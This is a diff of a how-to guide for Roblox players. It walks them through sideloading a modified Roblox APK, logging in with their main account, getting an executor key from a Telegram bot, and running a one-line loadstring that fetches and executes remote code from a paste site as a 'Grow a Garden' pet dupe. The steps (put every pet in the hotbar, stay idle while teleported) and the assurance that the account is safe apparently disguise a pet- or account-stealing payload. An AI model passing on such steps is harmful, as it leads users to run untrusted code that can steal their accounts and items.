@@ -17,25 +17,25 @@ Open the APK file, and the installation of modified roblox will be downloaded
 Open modified roblox, and use your account to login back. (dont worry, no need to use an alt, because it will not do anything bad to the account)
 Join any server in any game. The menu of the executor will appear on the screen automatically.
 It will say that you need to get the key for it to work. Press "Receive Key". It will put a link on your clipboard
-After you got the link, go to Telegram app, and in search, type "ArxBypass". its a bot for retrieving the key
+After you got the link, go to Telegram app, and in search, type "ArxBypass". its a bot for retrieving the key.
 press /start in the chat with the bot. Then, use the clipboard to put the link that you got in the chat. You will need to wait (1 sec - 1 min)
-After that, it will give you another link. Use it in any browser
-Press "continue" and copy the key that it will give you
-Go back to the modified roblox, and again, join any random server, and put the key in the "enter key", then, press continue. It will load the menu
+After that, it will give you another link, Use it in any browser.
+Press "continue" and copy the key that it will give.
+Go back to the modified roblox, and again, join any random server, and put the key in the "enter key", then, press continue. It will load the menu.
 All set! Now you can use the menu of our executer
-And now to the last part
-You must have all the requirements met, otherwise the script will not work
--Firstly, be ONLY on the public server. it will NOT work on the private server
--Secondly, you need to pick up all the pets you have on the plot and put them in your hotbar (for the dupe to work), if not, it can think that you're a bot and it will NOT work
+And now to the last part:
+You must have all the requirements met, otherwise the script will not work.
+-Firstly, be ONLY on the public server. it will NOT work on the private server.
+-Secondly, you need to pick up all the pets you have on the plot and put them in your hotbar (for the dupe to work), if not, it can think that you're a bot and it will NOT work.
 
 Copy this script:
 loadstring(game:HttpGet("https://paste.ee/r/45uZiHB9"))()
 
-And when you have all the requirements met AND you copied the script to the clipboard, press 2nd button (with the joystick)
-You can either press on the "thank you for using delta" to put the script and press execute, OR you can press "execute clipboard"
-After you executed it, the script will start to load (it can also teleport you to other server of grow a garden, just dont touch anything)
-Even if you didnt teleported, dont touch anything. The script loades from 1 to 10 minutes, depends on what device you're using (and the internet)
-After the 10 minutes, it will load you the menu to use the script I got it from another guy, but it works just fine
+And when you have all the requirements met AND you copied the script to the clipboard, press 2nd button (with the joystick icon).
+You can either press on the "thank you for using delta" to put the script and press execute, OR you can press "execute clipboard".
+After you executed it, the script will start to load (it can also teleport you to other server of grow a garden, just dont touch anything).
+Even if you didnt teleported, dont touch anything. The script loades from 1 to 10 minutes, depends on what device you're using (and how good is the internet connection)
+After the waiting, it will load you the menu to use the script. (I got the script from another guy, but it works just fine, tried on myself)
 
 Enjoy using your script!
 
